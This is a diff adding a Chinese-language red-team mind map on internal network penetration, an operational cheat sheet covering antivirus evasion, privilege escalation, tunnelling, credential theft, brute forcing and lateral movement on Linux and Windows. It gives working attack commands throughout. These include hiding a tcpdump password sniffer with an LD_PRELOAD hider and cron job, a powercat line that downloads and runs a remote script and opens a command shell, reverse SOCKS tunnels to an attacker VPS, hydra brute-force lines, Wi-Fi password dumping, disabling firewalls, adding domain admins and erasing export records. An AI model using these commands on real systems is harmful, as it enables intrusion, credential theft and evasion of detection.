@@ -1,3 +1,1536 @@
+**\#0). 脑图内容:**   
+# 内网渗透
+
+## 免杀
+
+### 1.修改特征码
+特征码：能识别一个程序是一个病毒的一段不大于64字节的特征串
+2.花指令免杀
+3.加壳免杀
+4.内存免杀
+5.二次编译
+6.分离免杀
+7.资源修改
+
+### msf自免杀
+
+- msf自编码处理
+- msf自捆绑免杀
+- msf自捆绑+编码
+- msf多重编码
+- msf-Evasion模块免杀
+
+### Veil免杀
+
+### Venom免杀
+
+### Shellter免杀
+
+### BackDoor-Factory免杀
+
+### Avet免杀
+
+### TheFatRat免杀
+
+### Avoidz免杀
+
+### Green-Hat-Suite免杀
+
+### zirikatu免杀
+
+### DKMC免杀
+
+### Unicorn免杀
+
+### Python-Rootkit免杀
+
+### ASWCrypter免杀
+
+### nps_payload免杀
+
+### GreatSCT免杀
+
+### HERCULES免杀
+
+### SpookFlare免杀
+
+### SharpShooter免杀
+
+### CACTUSTORCH免杀
+
+### Winpayloads免杀
+
+### mimikatz免杀
+
+## Pre-Operation
+
+### C2 server
+
+- Octopus
+
+## Linux Platform
+
+### 提权
+
+- 寻找:
+1.可写入的易受攻击的服务
+2.错误配置
+3.普通文件中的密码
+4.计划任务
+5.补丁问题
+- Dirty COW (CVE-2016-5195)
+- 提权检测
+
+	- https://github.com/Scotoma8/linuxprivchecker/blob/master/linuxprivchecker.py
+
+- Linux-EXP
+
+	- https://github.com/SecWiki/linux-kernel-exploits
+
+### 横向移动
+
+- 转发
+
+	- dnscat2: listen 127.0.0.1:9999 <target_IP>:22
+	- Metasploit: post/windows/manage/autoroute
+	- Metasploit Socks Proxy + Proxychains: use auxiliary/server/socks4a
+	- Meterpreter: portfwd add –l 3389 –p 3389 –r <target_IP>
+	- VPN over SSH
+
+- 通过普通用户权限隐形记录SSH登录密码
+
+### 账户密码提取
+
+- mimipenguin(CVE-2018-20781)
+- 本地密码嗅探
+
+	- 务必在高权限(root/system/administrator)下进行，挑个好时段，耐心等待，抓完就关，不建议在流量非常大的端口上进行这种嗅探操作
+	- 隐藏tcpdump进程
+
+		- libprocesshider
+
+			- 利用 LD_PRELOAD 来劫持系统函数，适用于CentOS 5.x，6.x
+
+				- 用完之后删掉对应的环境变量和so之后重启服务器即可
+
+					- static const char* process_to_filter = "tcpdump";
+
+	- make
+mv libprocesshider.so /usr/local/lib
+echo "export LD_PRELOAD=/usr/local/lib/libprocesshider.so" >> /etc/profile
+source /etc/profile
+crontab -l
+cat /var/spool/cron/root
+echo '*/10 * * * * /usr/sbin/tcpdump -i eth0 -s 0 -A -vv dst host x.x.x.x and port 21 -w /tmp/.Sys_Cache.pcap' >> /var/spool/cron/root
+ls -la /tmp/
+sed -i "/tcpdump/d" /var/spool/cron/root
+crontab -l
+ps -ef | grep "tcpdump" | grep -v "grep"
+	- # export HISTCONTROL=ignorespace      养成习惯,带空格敲命令,只对当前shell进程有效,记得把后续要执行的所有命令前都带个空格,避免记录到命令历史
+# sed -i "/libprocesshider/d" /etc/profile
+# rm -f /usr/local/lib/libprocesshider.so //再干掉tcpdump进程
+	- 抓取Jenkins
+
+		- GET /manager/html
+Host: x.x.x.x:8080
+		- # tcpdump -i eth0 -s 0 -A -vv dst host 192.168.159.6 and port 8080 -w /tmp/.WebCache.pcap
+
+	- 抓取POST表单
+
+		- POST /phpMyAdmin/index.php
+Host: x.x.x.x
+		- # tcpdump -i eth0 -s 0 -A -vv 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)' -w /tmp/.Cache.pcap
+
+### 建立隧道
+
+- DNScat2-通过DNS隧道进行C&C通信
+- 使用stunnel封装特定服务到https流量
+- 使用httptunnel封装特定服务到http流量
+- SSH代理及转发
+
+	- 开启socks代理
+
+		- ssh -qTfnN -D 1111 root@1.1.1.1
+		- 输入1.1.1.1机器密码 本地利用proxychains等类似工具连接本地的1111端口的sock5连接 即可代理1.1.1.1的网络
+
+	- 控制A、B机器，A能够访问B，且能出网，B能够访问C，但不能出网，A不能访问C
+
+		- A机器执行
+
+			- ssh -CNfg -L 2121:CIP:21 root@BIP
+			- 输入BIP机器密码，访问A的2121端口即是访问CIP的21端口
+
+	- 控制A机器，A能够访问B
+
+		- A机器执行
+
+			- ssh -CNfg -R 2121:BIP:21 root@hackervps
+			- 输入黑客vps密码，访问黑客vps的2121端口即是访问BIP的21端口
+
+- reGeorg
+
+	- 根据网站支持的语言，把相应的tunnel.xx传到服务器上，访问tunnel.xx显示 Georg says, 'All seems fine'
+	- 本地运行
+
+		- python reGeorgSocksProxy.py -p 9999 -u http://1.1.1.1:8080/tunnel.xx
+		- 利用proxychains等类似工具连接本地的9999端口的sock5连接即可代理1.1.1.1的网络
+
+- EarthWorm
+
+	- 受害者机器有外网ip并可直接访问
+
+		- 把ew传到对方服务器上
+		- ./ew -s ssocksd -l 8888
+		- 本地利用proxychains等类似工具连接本地的对方服务器的8888端口的sock5连接即可代理对方的网络
+
+	- 控制A机器，A能够访问B，通过A访问B
+
+		- 在自己外网服务器上执行
+
+			- ./ew -s rcsocks -l 1080 -e 8888
+
+		- 对方服务器执行
+
+			- ./ew -s rssocks -d yourvpsip -e 8888
+
+		- 利用proxychains等类似工具可通过连接你的外网vps的1080 端口的socks5，即可代理受害者服务器的网络
+
+	- 控制A、B机器，A能够访问B，B能够访问C，A有外网ip并可直接访问，通过A来使用B的流量访问C
+
+		- B机器执行
+
+			- ./ew -s ssocksd -l 9999
+
+		- A机器
+
+			- ./ew -s lcx_tran -l 1080 -f BIP -g 9999
+
+		- 利用proxychains等类似工具可通过连接A的1080 端口的socks5，即可代理B服务器的网络
+
+	- 控制A、B机器，A能够访问B，B能够访问C，A没有外网ip，通过A连接自己的外网vps来使用B的流量访问C
+
+		- 自己vps执行
+
+			- ./ew -s lcx_listen -l 1080 -e 8888
+
+		- B机器执行
+
+			- ./ew -s ssocksd -l 9999
+
+		- A机器执行
+
+			- ./ew -s lcx_slave -d vpsip -e 8888 -f BIP -g 9999
+
+		- 利用proxychains等类似工具可通过连接你自己的vps的1080 端口的socks5，即可代理B服务器的网络
+
+- lcx
+
+	- 反向转发
+
+		- 外网VPS机器监听
+
+			- lcx.exe -listen 1111 2222
+
+		- 受害者机器执行
+
+			- lcx.exe -slave VPSip 1111 127.0.0.1 3389
+
+		- 连接外网VPS机器的2222端口即是连接受害者机器的3389
+
+	- 正向转发
+
+		- A机器执行
+
+			- lcx.exe -tran 1111 2.2.2.2 8080
+
+		- 访问A机器的1111端口即是访问2.2.2.2的8080端口
+
+- powercat
+
+	- powershell "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -l -p 8000 -e cmd"
+
+- mssql
+
+	- https://github.com/blackarrowsec/mssqlproxy
+
+### 信息收集
+
+- LinEnum工具:底层系统的所有信息
+- linux-exploit-suggester工具:分析主机系统识别缺失的补丁和漏洞
+- rkhunter:
+Unix-based tool that scans for rootkits, backdoors and possible local exploits
+
+	- https://github.com/installation/rkhunter
+
+- 存活自动化探测
+
+	- 10.x.x.x ，172.16.x.x -
+	- 172.31.x.x ， 192.168.x.x
+	- 扫描脚本 - 完全依靠系统内置工具
+
+		- #!/bin/bash
+
+# 内网存活段自动探测脚本 [Linux] 
+# By Klion
+# 2020.7.1
+
+for i in {0..255}  
+do
+  for j in {0..255}
+  do
+    ping -c 1 -w 1 10.$i.$j.1 | grep "ttl=" >/dev/null 2>&1 || ping -c 1 -w 1 10.$i.$j.254 | grep "ttl=" >/dev/null 2>&1
+    if [ $? -eq 0 ];then
+      echo 10.$i.$j.0/24 is alive ! >> aliveHost.txt
+    else
+      echo 10.$i.$j.0/24 May be sleeping !
+    fi
+  done
+done  
+
+for k in {16..31}  
+do
+  for u in {0..255}
+  do
+    ping -c 1 -w 1 172.$k.$u.1 | grep "ttl=" >/dev/null 2>&1 || ping -c 1 -w 1 172.$k.$u.254 | grep "ttl=" >/dev/null 2>&1
+    if [ $? -eq 0 ];then
+      echo 172.$k.$u.0/24 is alive ! >> aliveHost.txt
+    else
+      echo 172.$k.$u.0/24 May be sleeping !
+    fi
+  done
+done
+
+
+for t in {0..255}
+do
+  ping -c 1 -w 1 192.168.$t.1 | grep "ttl=" >/dev/null 2>&1 || ping -c 1 -w 1 192.168.$t.254 | grep "ttl=" >/dev/null 2>&1
+  if [ $? -eq 0 ];then
+    echo 192.168.$t.0/24 is alive ! >> aliveHost.txt
+  else
+    echo 192.168.$t.0/24 May be sleeping !
+  fi
+done
+
+
+### 权限维持
+
+- centos实现pam认证后门
+- PRISM后门(需root权限)
+- SSH劫持sshd_config配置中公钥文件后门
+- SSH会话劫持(记录命令及其回显)
+- 键盘记录器(xkeylogger无需root权限)
+- keysniffer内核级键盘记录
+- 终端交互实时键盘记录器(shelljack)
+
+## Windows Platform
+
+### 信息收集
+
+- C段信息
+
+	- https://github.com/7kbstorm/smb_version_threadpool/blob/master/smbver.exe
+
+- 存活自动化探测
+
+	- 10.x.x.x ，172.16.x.x -
+	- 172.31.x.x ， 192.168.x.x
+	- 扫描脚本 - 完全依靠系统内置工具
+
+		- @echo off
+
+rem 内网存活段自动发现脚本 [Windows] 
+rem By Klion
+rem 2020.7.1
+
+setlocal enabledelayedexpansion
+
+for /l %%i in (0,1,255) do (
+  for /l %%k in (0,1,255) do (
+    ping -w 1 -n 1 10.%%i.%%k.1 | findstr "TTL=" >nul || ping -w 1 -n 1 10.%%i.%%k.254 | findstr "TTL=" >nul
+    if !errorlevel! equ 0 (echo 10.%%i.%%k.0/24 is alive ! >> alive.txt ) else (echo 10.%%i.%%k.0/24 May be sleeping ! )
+  )
+)
+
+for /l %%s in (16,1,31) do (
+  for /l %%d in (0,1,255) do (
+    ping -n 1 -w 1 172.%%s.%%d.1  | findstr "TTL=" >nul || ping -w 1 -n 1 172.%%s.%%d.254 | findstr "TTL=" >nul
+    if !errorlevel! equ 0 (echo 172.%%s.%%d.0/24 is alive ! >> alive.txt ) else (echo 172.%%s.%%d.0/24 May be sleeping ! )
+  )
+)
+
+for /l %%t in (0,1,255) do (
+  ping -n 1 -w 1 192.168.%%t.1  | findstr "TTL=" >nul || ping -n 1 -w 1 192.168.%%t.254 | findstr "TTL=" >nul
+  if !errorlevel! equ 0 (echo 192.168.%%t.0/24 is alive ! >> alive.txt ) else (echo 192.168.%%t.0/24 May be sleeping ! )
+)
+
+- 权限信息
+
+	- whoami /all
+	- whoami /priv
+
+- 资源使用情况
+
+	- net session
+
+- 存活主机探测
+
+	- NetBIOS协议
+
+		- nbtscan 192.168.6.0/24
+
+	- ICMP协议
+
+		- for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.174.%I | findstr "TTL=" - WIN
+		- for i in {1..254};do ping -w 1 -c 1 192.168.6.$i | grep "ttl=";done - Linux
+
+- 端口探测
+
+	- Telnet协议
+
+		- telnet ip port
+
+	- msf
+
+		- auxiliary/scanner/portscan/tcp
+
+	- PowerSploit
+
+		- Invoke-portscan.ps1
+
+			- Invoke-Portscan -Hosts 192.168.174.0/24 -T 4 -ports '445,1433,8080,3389,80' -oA c:\windows\temp\res.txt
+
+- DNS记录获取
+
+	- windows server
+
+		- dnscmd . /ZonePrint domain.com
+		- dnscmd . /EnumRecords domain.com .
+
+	- 非windows server
+
+		- PowerView
+
+			- import-module  PowerView.ps1
+Get-DNSRecord  -ZoneName domain.com
+
+- WIFI
+
+	- 获取连接过的wifi密码
+
+		- for /f  "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles')  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear
+
+- GPP
+
+	- 分发组策略
+
+		- 在域的SYSVOL目录下生成一个gpp配置的xml文件
+
+			- 加密过的管理员账号密码
+
+				- aes加密密钥 
+
+					- https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
+					- 解密
+
+						- https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1
+
+	- 域用户登录脚本存放目录
+
+		- 敏感文件
+
+			- \\domain\Netlogon
+
+- 自动化信息收集
+
+	- Seatbelt
+	- Bloodhound
+
+		- SharpHound.exe  -c all
+
+- Exchange
+
+	- 邮箱用户密码爆破 - 次数过多会导致域用户锁定
+
+		- ./ruler  --domain targetdomain.com brute --users /path/to/user.txt --passwords  /path/to/passwords.txt
+
+	- 通讯录收集
+
+		- Get-GlobalAddressList  -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016  -OutFile global-address-list.txt
+
+	- 信息收集
+
+		- 获取所有邮箱用户
+
+			- Get-Mailbox
+
+		- 导出邮件
+
+			- New-MailboxexportRequest  -mailbox username -FilePath ("\\localhost\c$\test\username.pst")
+
+		- web口导出
+
+			- https://mail.domain.com/ecp/
+
+		- 导出会有记录
+
+			- Get-MailboxExportRequest
+
+		- 删除某个导出记录
+
+			- Remove-MailboxExportRequest  -Identity 'username\mailboxexport' -Confirm:$false
+
+- 域相关操作
+
+	- 判断DNS和域控是否为同一服务器:
+ipconfig /all查看DNS后缀
+nslookup DNS后缀
+	- 定位域控
+
+		- net time /domain
+		- nltest /DCLIST:domainname
+		- Nslookup -type=SRV _ldap._tcp
+		- net group "Domain Controllers" /domain
+
+	- 定位域管
+
+		- 工具
+
+			- psloggedon.exe、pveFindADUser.exe、netsess.exe、hunter、NetView、PowerView
+
+		- psloggedon.exe 显示本地登录的用户和通过本地计算机或远程计算机的资源登录的用户
+https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon
+psloggedon [-] [-l] [-x] [\\computername|username]
+-：显示支持的选项和用于输出值的单位
+-l：仅显示本地登录，不显示本地和网络资源登录
+-x：不显示登录时间
+computername：指定要列出登录信息的计算机的名称
+Username：指定用户名，在网络中搜索该用户登录的计算机
+		- pveFindADUser.exe
+查找 Active Directory 用户登录的位置，枚举域用户，以及查找在 特定计算机上登录的用户，包括本地用户、通过RDP 登录的用户、用于运行服务和计划任务的用户账户
+需.NET Framework 2.0环境、管理员权限
+https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn
+-h：显示帮助
+-u：检查是否有更新版本的实用程序
+-current [''username'']：如果仅指定了-current 参数，将获取所有目标计算机上当前登录的所 有用户。如果指定了用户名（DOMAIN\Username），则显示该用户登录的计算机
+-last [''username'']：如果仅指定了-last 参数，将获取目标计算机上的最后一个登录用户。如果指定了用户名（DOMAIN\Username），则显示具有此用户账户作为上次登录的计算机，根据网络的策略，可能会隐藏最后一个登录用户名，且该工具可能无法得到该用户名
+-noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行 ping 命令
+-target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主 机。如果指定此参数，则后跟一个由逗号分隔的主机名列表
+		- netview.exe 使用 WinAPI 枚举系统，利用 NetSessionEnum 找寻登录会话， 利用 NetShareEnum找寻共享，利用 NetWkstaUserEnum枚举登录的用户
+不需管理员权限
+https://github.com/mubix/netview
+-h：显示帮助菜单
+-f filename.txt：指定从中提取主机列表的文件
+-e filename.txt：指定要排除的主机名文件
+-o filename.txt：将所有输出重定向到文件
+-d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域
+-g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins
+-c：检查对已找到共享的访问权限
+
+	- PowerShell 收集域信息
+
+		- PowerShell 2.0 内置在Windows Server 2008 和 Windows 7中
+PowerShell 3.0 内置在Windows Server 2012 和 Windows 8中
+PowerShell 4.0 内置在 Windows Server 2012 R2 和 Windows 8.1中
+PowerShell 5.0 内置在 Windows Server 2016 和 Windows 10中
+		- Get-ExecutionPolicy
+Set-ExecutionPolicy Unrestricted
+Restricted：默认设置，不允许执行任何脚本。
+Allsigned：只能运行经过证书验证的脚本。
+Unrestricted：权限最高，可以执行任意脚本。
+RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名
+
+	- PowerView 收集域信息
+
+		- 依赖PowerShell和WMI对内网域情况进行查询的常用渗透脚本
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+ImportModule .\PowerView.ps1
+Get-NetDomain：获取当前用户所在的域名称
+Get-NetUser：返回所有用户的详细信息
+Get-NetDomainController：获取所有域控制器
+Get-NetComputer：获取所有域内机器的详细信息
+Get-NetOU：获取域中的 OU 信息
+Get-NetGroup：获取所有域内组和组成员信息
+Get-NetFileServer：根据 SPN 获取当前域使用的文件服务器
+Get-NetShare：获取当前域内所有网络共享
+Get-NetSession：获取在指定服务器存在的会话信息
+Get-NetRDPSession：获取在指定服务器存在的远程连接信息
+Get-NetProcess：获取远程主机的进程信息
+Get-UserEvent：获取指定用户的日志信息
+Get-ADObject：获取活动目录的对象信息
+Get-NetGPO：获取域所有组策略对象
+Get-DomainPolicy：获取域默认或域控制器策略
+Invoke-UserHunter：用于获取域用户登录计算机及该用户是否有本地管理权限
+Invoke-ProcessHunter：查找域内所有机器进程用于找到某特定用户
+Invoke-UserEventHunter：根据用户日志获取某域用户登录过哪些域机器
+
+	- net accounts /domain 账户设置信息
+	- net group "domain admins" /domain
+	- net group "domain controllers" /domain
+	- net group "domain users" /domain
+	- net group "domain computers" /domain
+	- 查看共享资料
+
+		- net view /domain
+
+	- nltest /domain_trusts 获取域信任列表
+	- 暴力枚举域用户名
+	- PowerView查询AD收集域内网络拓扑信息
+	- bloodhound图表揭示域内信息与攻击路径
+	- net localgroup administrators domain\domain_username /add 添加域用户为本地管理员
+	- net user /domain "domain_user" "new_password" 更改域用户密码
+	- net group "domain admins" username /add 添加域用户到域管理员组
+	- 域控执行:net user test Tt111111 /add 创建域用户test
+	- 域控执行:dsquery user/computer 查询域内用户和计算机信息
+	- 查询域内存活的服务及服务器
+
+		- setspn -T difang.com -Q */*
+		- cscript GetUserSPNs.vbs
+		- rubeus.exe kerberoast
+
+- 进程服务信息
+
+	- tasklist /svc 
+	- wmic service list
+	- wmic process list
+	- tasklist /s machine_name /u domain\username /p "password"
+	- taskkill /F /IM process_name /T 强制结束当前机器指定进程
+	- taskkill /s machine_name /u domain\username /p "password" /FI "USERNAME eq domain\username" /F /IM process_name /T 强制结束远程机器上指定用户的进程
+	- tasklist /m xxx.dll 查看指定dll所启动的进程
+	- tasklist /fi "USERNAME ne NT AUTHORITY\SYSTEM" /fi "STATUS eq running" /v 查看非system权限的进程
+	- 干掉指定进程(以高权限执行)(对杀软没啥效果):
+ntsd.exe -c q -pn xxx.exe
+ntsd.exe -c q -p PID
+	- CS内置ps命令
+	- SC命令
+	- net start 查看当前已启动的服务
+
+- 软件版本信息
+
+	- wmic product get name,version /output:C:\windows\temp\softwares.txt
+	- wmic /node:ip /user:username /password:"password" product get name,version 查看远程主机上软件版本信息
+
+- SESSION信息
+
+	- query user || qwinsta
+
+- 环境变量信息
+
+	- cmd:path
+	- CS内置set命令
+
+- 查询wmi信息
+
+	- powershell:get-wmiobject -class win32_operatingsystem | select -property * > c:\os.txt
+
+- 系统/补丁信息
+
+	- systeminfo命令
+	- wmic qfe get description,hotfixid
+	- wmic /node:ip /user:domain\username /password:"password" qfe get description,hotfixid
+	- wmic /node:ip /user:username /password:"password" PROCESS call create "wusa /uninstall /kb:xxxxxxx /quiet /norestart" 卸载远程主机上指定补丁(需管理员权限)
+
+- 连接建立信息
+
+	- netstat命令
+
+- 查看hosts文件
+
+	- linux:
+cat  /etc/hosts
+	- windows:
+type  c:\Windows\system32\drivers\etc\hosts
+
+- 查看dns缓存
+
+	- ipconfig  /displaydns
+
+- 会话收集
+
+	- 枚举域内计算机的活动会话
+
+		- NetSessionEnum function
+
+			- https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum
+			- C:\PS> Invoke-NetSessionEnum -HostName SomeHostName Invoke-CreateProcess
+
+	- 查看域用户登录过哪些机器
+
+		- Import-Module .\PowerView.ps1
+Invoke-UserHunter -UserName "user1"
+
+	- 查看机器被哪些域用户登录过
+
+		- Import-Module .\PowerView.ps1
+Get-NetSession -ComputerName dcserver
+
+- 搜索文件中密码信息
+
+	- findstr /si pass *.txt或*.xml或*.ini
+	- findstr  /s /m "password" *.*
+
+- 默认配置路径
+
+	- Tomcat:
+CATALINA_HOME/conf/tomcat-users.xml
+	- Apache:
+/etc/httpd/conf/httpd.conf
+	- Nginx:
+/etc/nginx/nginx.conf
+	- Wdcp:
+/www/wdlinux/wdcp/conf/mrpw.conf
+	- Mysql:
+mysql\data\mysql\user.MYD
+
+- IIS站点物理路径及端口信息
+
+	- IIS6.0
+
+		- cscript.exe c:\adsutil.vbs
+
+	- IIS7/8
+
+		- appcmd.exe list site
+appcmd.exe list vdir
+
+- 文件夹或文件ACL信息
+
+	- 查询
+
+		- cacls.exe 目录或文件
+
+	- 修改
+
+		- icacls.exe "目录" /grant Everyone:(OI)(CI)F /T
+
+- Empire
+
+	- privesc/powerup/allchecks
+
+- 各种敏感命令检索工具RTFM.py
+- 键盘记录器
+- 系统架构信息
+
+	- echo %PROCESSOR_ARCHITECTURE%
+
+- 计划任务信息
+
+	- schtasks /query /fo  LIST /v
+
+- 本机共享信息
+
+	- net share
+	- wmic share get name,path,status
+
+- 路由缓存表
+
+	- route print
+	- arp -A
+
+- 防火墙配置
+
+	- 关闭命令
+
+		- Windows Server 2003系统及以前版本
+
+			- netsh firewall set opmode disable
+
+		- Windows server 2003之后系统版本
+
+			- netsh advfirewall set allprofiles state off
+
+	- 查询配置
+
+		- netsh firewall show config
+
+	- 修改配置
+
+		- Windows Server 2003系统及之前版本，允许指定程序全部链接
+
+			- netsh firewall add allowedprogram c:\nc.exe "allow nc" enable
+
+		- Windows server 2003 之后系统版本
+
+			- 允许指定程序连入
+
+				- netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C: \nc.exe"
+
+			- 允许指定程序连出
+
+				- netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C: \nc.exe"
+
+			- 允许 3389 端口放行
+
+				- netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
+
+			- 自定义防火墙日志存储位置
+
+				- netsh advfirewall set currentprofile logging filename "C:\windows\temp\fw.log"
+
+- RDP服务
+
+	- 查看服务端口
+
+		- REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber
+
+	- 查看3389是否开启
+
+		- REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+fDenyTSConnections    REG_DWORD    0x1 为未开放
+
+	- 在Windows Server 2003中开启3389端口
+
+		- wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
+		- REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+	- 在Windows Server 2008 和 Windows Server 2012 中开启 3389 端口
+
+		- wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1(需管理员)
+wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1
+reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+### 猜解登录凭证
+
+- retrieve passwords
+
+	- https://github.com/Scotoma8/LaZagne
+
+- 密码喷洒攻击
+-  Responder 侦听并伪造请求获得网络上的凭据
+- 通过 SMB 协议爆破远程主机的用户名和密码
+
+	- xHydra(kali自带)
+	- Hydra
+	- Ncrack
+	- Medusa
+	- Metasploit
+
+- hydra 基础服务弱口令探测
+
+	- 爆破mssql:hydra -l sa -P pwd.txt -e ns -f -o res.json -b json -M ip.txt -t 8 -T 16 -w 20 -V mssql
+	- 爆破smb:hydra -l administrator -P pwd.txt -e ns -f -o res.txt -M ip.txt -t 8 -T 16 -w 20 -V smb
+	- 爆破rdp:hydra -l domain\\administrator -P pwd.txt -e ns -f -o res.txt -t 4 -w 20 -V rdp://ip
+	- 爆破ssh:hydra -l root -P pwd.txt -e ns -f -o res.txt -t 8 -T 16 -w 20 -V ssh://ip
+	- 爆破mysql:hydra -l root -P pwd.txt -e ns -f -o res.txt -M ip.txt -t 8 -T 16 -w 20 -V mysql
+	- 爆破pg:hydra -l postgres -P pwd.txt -e ns -f -o res.txt -M ip.txt -t 8 -T 16 -w 20 -V postgres
+	- 爆破redis:hydra -P pwd.txt -e ns -f -o res.txt -t 8 -T 16 -w 20 -V redis://ip
+	- 爆破ftp:hydra -l wwwadmin -P pwd.txt -e ns -f -o res.txt -t 8 -T 16 -w 20 -V ftp://ip
+	- 爆破smtp:hydra -l zhangsan@company.com -P pwd.txt -e ns -f -o res.txt -t 8 -T 16 -w 20 -V smtp://ip
+	- 爆破imap:hydra -S -l zhangsan@company.com -P pwd.txt -e ns -f -o res.txt -t 8 -T 16 -w 20 -V imap://ip
+	- 爆破pop3:hydra -S -l zhangsan@company.com -P pwd.txt -e ns -f -o res.txt -t 8 -T 16 -w 20 -V pop3://ip
+	- 爆破telnet:hydra -l administrator -P pwd.txt -e ns -f -o res.txt -M ip.txt -t 8 -T 16 -w 20 -V telnet
+	- 爆破snmp:hydra -P pwd.txt -e ns -f -o res.txt -M ip.txt -t 8 -T 16 -w 20 -V snmp
+	- 爆破socks5:hydra -l admin -P pwd.txt -e ns -f -o res.txt -t 8 -T 16 -w 20 -s port -V socks5://ip
+
+- 爆破pptp协议的vpn
+
+	- the-pptp-bruter -n 100 -u vpn ip < pwd.txt
+
+- 通过加密隧道进行服务爆破
+
+	- http加密隧道
+
+		- abptts基于ssl加密的http隧道工具:
+pip install pycrypto
+pip install httplib2
+python abpttsfactory.py -o webshell
+python abpttsclient.py -c webshell\config.txt -u "http://ip/abptts.aspx" -f 127.0.0.1:445/127.0.0.1:445
+hydra -l administrator -P pwd.txt -e ns -f -o res.txt -t 8 -T 16 -w 20 -V smb://127.0.0.1
+
+	- socks5加密隧道
+
+		- 建立隧道:
+攻击机执行: ./ew_for_linux64 -s rcsocks -l 1080 -e 8888
+目标机执行: ew_for_Win.exe -s rssocks -d 攻击机ip -e 8888
+配置代理:
+proxychains.conf:
+ProxyList:
+socks5 攻击机ip 1080
+服务爆破:
+proxychains hydra -l sa -P pwd.txt -e ns -f -o res.txt -t 8 -T 16 -w 20 -V mssql://目标ip
+
+### 横向移动
+
+- 通过伪造凭证或进程注入获得对其他主机有访问权(find_localadmin_access)的身份
+- invoke-wmi 使用本地缓存凭据且可访问远程主机获取目标机shell
+- 利用 DCOM中ShellBrowserWindow 和 ShellWindows进行RCE反弹shell
+- Empire平台
+
+	- inveigh_relay
+	- invoke_executemsbuild
+	- invoke_psremoting
+	- invoke_sqloscmd
+	- invoke_wmi
+	- jenkins_script_console
+	- invoke_dcom
+	- invoke_psexec
+	- invoke_smbexec
+	- invoke_sshcommand
+	- invoke_wmi_debugger
+	- new_gpo_immediate_task
+
+- PASS THE HASH
+- xfreerdp(PTH and RDP)
+- Overpass the hash
+- Pass the Key
+- 委派攻击
+
+	- 无约束委派
+	- 约束委派
+	- 基于资源的约束委派
+
+- PASS THE TICKET(Golden/Silver)
+- Pass the Ticket(Rubeus.exe)
+- 在内网中通过vps进行RDP横移(SSH隧道转发)
+- 使用已知高权限账户身份通过SMB协议横移
+
+	- SMB Share Enumeration
+	- SMB User Enumeration (SAM EnumUsers)(Local Users)
+	- SMB SID User Enumeration (LookupSid)(both local and domain accounts)
+	- Microsoft Windows 身份验证用户代码执行
+	- Microsoft Windows 身份验证的 Powershell 命令执行
+	- Microsoft Windows 身份验证管理实用程序(stage2，返回meterpreter会话)
+	- SMB Impacket WMI Exec(执行命令)
+	- Impacket for Psexec.py(返回完整交互式shell)
+	- Impacket for Atexec.py(执行命令)
+	- PsExec.exe(访问网络中其他计算机，直连远程主机的shell)
+	- Atelier Web 图形化界面远程控制受害者主机
+	- MS17_010_psexec 反弹meterpreter会话
+	- MS17_010_command远程命令执行(stage2,反弹meterpreter会话)
+
+- RDP劫持
+- 使用certutil实现向内网机器上传工具
+
+### 建立隧道
+
+- DNScat2-通过DNS隧道进行C&C通信
+- 是否出网
+
+	- ping
+
+		- icmp
+
+	- curl
+
+		- http
+
+	- nslookup
+
+		- dns
+
+- netsh修改网络配置
+
+	- 端口转发
+
+		- 机器A
+
+			- netsh  interface portproxy add v4tov4 listenport=5555 connectport=3389 connectaddress=192.168.1.1  protocol=tcp
+
+		- B机器访问A机器的5555端口，即是192.168.1.1的3389端口
+
+### 提权
+
+- MS-EXP
+
+	- https://github.com/SecWiki/windows-kernel-exploits
+
+- check漏洞工具
+
+	- Windows Exploit Suggester
+	- https://bugs.hacking8.com/tiquan/
+
+- 第三方软件提权
+
+	- https://insecure.org/search.html?q=privilege%20escalation
+
+	- https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=escalation&colspec=ID+Type+Status+Priority+Milestone+Owner+Summary&cells=ids
+
+- 系统0day提权
+- PASS THE CACHE(MS14068)
+- 修改域用户SID历史记录提权
+- MSF框架提权模块
+
+	- Local Exploit Suggester 辅助提权模块
+	- Windows ClientCopyImage Win32k漏洞利用(win7 32/64位/win2008R2 SP1 64位)
+	- Windows TrackPopupMenu Win32k NULL Pointer Dereference(Windows XP SP3/Windows Server 2003 SP2/Windows7 SP1/Windows Server2008 32位/Windows Server2008R2 SP1 64位)
